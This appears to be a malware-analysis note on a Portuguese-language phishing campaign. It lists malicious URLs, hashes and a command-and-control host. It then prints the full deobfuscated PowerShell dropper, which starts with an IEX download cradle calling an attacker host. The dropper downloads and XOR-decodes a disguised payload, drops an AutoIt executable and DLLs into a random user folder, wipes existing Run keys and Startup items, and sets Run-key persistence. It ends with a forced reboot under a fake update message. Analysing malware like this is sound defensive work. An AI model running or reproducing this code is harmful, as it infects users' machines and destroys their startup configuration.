### Malicious URL
http://descoweb1.evolutionmudial2021.org/
http://www.google.com/url?sa=D&q=https://hangouts.google.com/linkredirect%3Fdest%3Dhttps://imunne.com.br/ambiente_seguro/%3Fcliente%3Dagropecuariafernandes@gmail.com/

### PunyCode

### SHA256
834e2fd83226e7b24220c80b7246766bc70ca6937ca8d9eea034dcbf96dbdf24 M
ee38171c75dbb5c3cde877ec28d8cca9eec2ca3277eea9250e03bd90b1125d6f S

### Reversing
https://pastebin.com/raw/845duLiC
ec2-52-53-181-33.us-west-1.compute.amazonaws.com:8243
iex("IEX(New-Object Net.WebClient).DownloadString('https://myby.xtksemlimites.com/ksdufjhweiutgmymy/?a=Z0DEXUBSWD7FE45T3JHBMMJXCW3DON98P9LY3SRT')");
IEX(New-Object Net.WebClient).DownloadString('https://myby.xtksemlimites.com/ksdufjhweiutgmymy/?a=Z0DEXUBSWD7FE45T3JHBMMJXCW3DON98P9LY3SRT')

Criando texto Scriptblock (1 de 1):
	#$strMarcadordeHorasGate = "$env:UserProfile\$env:ComputerName$env:UserName.$env:Processor_Revision"
	#$bExisteArquivoLog = [System.IO.File]::Exists($strMarcadordeHorasGate)

	Function Get-RandomAlphanumericString {
	[CmdletBinding()]
	Param (
	[int] $length = 8
	)
	Begin{
	}
	Process{
	Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count $length | % {[char]$_}) )
	}
	}

	if (-Not $bExisteArquivoLog)
	{
	#"" | Set-Content $strMarcadordeHorasGate

	$array = (0..8) 

	$array[0] = [environment]::getfolderpath("Templates")
	$array[1] = [environment]::GetFolderPath("ApplicationData")
	$array[2] = [Environment]::GetEnvironmentVariable("Public") + "\Documents"
	$array[3] = [Environment]::GetEnvironmentVariable("Public") + "\Pictures"
	$array[4] = [Environment]::GetEnvironmentVariable("Public") + "\Music"
	$array[5] = [Environment]::GetEnvironmentVariable("Public") + "\Videos"	
	$array[6] = [environment]::getfolderpath("MyDocuments")
	$array[7] = [environment]::getfolderpath("MyMusic")
	$array[8] = [environment]::getfolderpath("MyPictures") 

	$Num = Get-Random -Maximum 8
	$NomePasta = Get-RandomAlphanumericString 12
	$Directory = "Â©" + $NomePasta
	$strCaminhoPastaCaixa = $array[$Num] + "\" + $Directory + "\"
	[system.io.directory]::CreateDirectory("$strCaminhoPastaCaixa")
    

	$strCaminhoCaixaZipada = Get-RandomAlphanumericString 11
	$strCaminhoCaixaZipada = "$strCaminhoPastaCaixa$strCaminhoCaixaZipada"+"."+"z"+"i"+"p"

	$strUrlCaixaZipada = "https://myby.xtksemlimites.com/ksdufjhweiutgmymy/astrogenica.jpg"

	(New-Object System.Net.WebClient).DownloadFile($strUrlCaixaZipada, $strCaminhoCaixaZipada)

	$objBytesCaixaZipada = [System.IO.File]::ReadAllBytes($strCaminhoCaixaZipada)

	for($i=0; $i -lt $objBytesCaixaZipada.count; $i++) 
	{
	$objBytesCaixaZipada[$i] = $objBytesCaixaZipada[$i] -bxor 0x91
	}  
	[System.IO.File]::WriteAllBytes($strCaminhoCaixaZipada,$objBytesCaixaZipada)

	$objArrayArqsZip = New-Object System.Collections.ArrayList
	$objShelApplication = New-Object -com shell.application
	$objArquivoZipado = $objShelApplication.NameSpace($strCaminhoCaixaZipada)
	foreach($item in $objArquivoZipado.items())
	{
	$objShelApplication.Namespace($strCaminhoPastaCaixa).copyhere($item)
	$objArrayArqsZip.Add($item.name)
	  }

	$strNomeScriptAutoIt1 = Get-RandomAlphanumericString 15
	$strNomeScriptAutoIt = $strNomeScriptAutoIt1 + "Â®" + ".exe"
	$strPathScriptAutoIt = $strCaminhoPastaCaixa + $strNomeScriptAutoIt

	$strNomecarambola1 = "imgengine"
	$strNomecarambola = $strNomecarambola1 + ".dll"
	$strPathNomecarambola = $strCaminhoPastaCaixa + $strNomecarambola

	$strNomecaradePau1 = "sptdintf"
	$strNomecaradePau = $strNomecaradePau1 + ".dll"
	$strPathNomecaradePau = $strCaminhoPastaCaixa + $strNomecaradePau

	foreach ($element in $objArrayArqsZip) 
	{
	$strNomeArquivo = (Get-Item "$strCaminhoPastaCaixa$element").Name

	if($strNomeArquivo.StartsWith("01"))
	{ 
		Rename-Item -Path "$strCaminhoPastaCaixa$element" -NewName $strNomeScriptAutoIt
	}      
	if($strNomeArquivo.StartsWith("02"))
	{
		Rename-Item -Path "$strCaminhoPastaCaixa$element" -NewName $strNomecaradePau
	}
	if($strNomeArquivo.StartsWith("03"))
	{
		Rename-Item -Path "$strCaminhoPastaCaixa$element" -NewName $strNomecarambola
	} 

	}
	Start-Sleep -s 6
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -recurse 2>$null
	Start-Sleep -s 3
	Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -recurse 2>$null
    Start-Sleep -s 4
	Remove-item -path "${env:APPDATA}\Microsoft\Windows\Start Menu\Programs\Startup\*.*" -recurse 2>$null
    Start-Sleep -s 4
	Remove-item -path "${env:PROGRAMDATA}\Microsoft\Windows\Start Menu\Programs\Startup\*.*" -recurse 2>$null	
    Start-Sleep -s 3
	$registrokey = Get-RandomAlphanumericString 9
    $regPath = 'HKCU:\SOFTWARE\Microsoft\Windows\Currentversion\Run'
	$Command = ("`"$strPathScriptAutoIt`"")
    New-Item $regPath -Force | Out-Null
    New-ItemProperty $regPath -Name "$registrokey" -Value "$Command" -Force | Out-Null   
	Remove-Item -Path $strCaminhoCaixaZipada -Force
	Get-ChildItem -Path $strCaminhoCaixaZipada | Remove-Item -Force
	Stop-Process -name CMD
    shutdown -r -f -t 10 -c "Windows atualizado com sucesso"
	Stop-Process -name Powershell
	cls
	exit
	
}
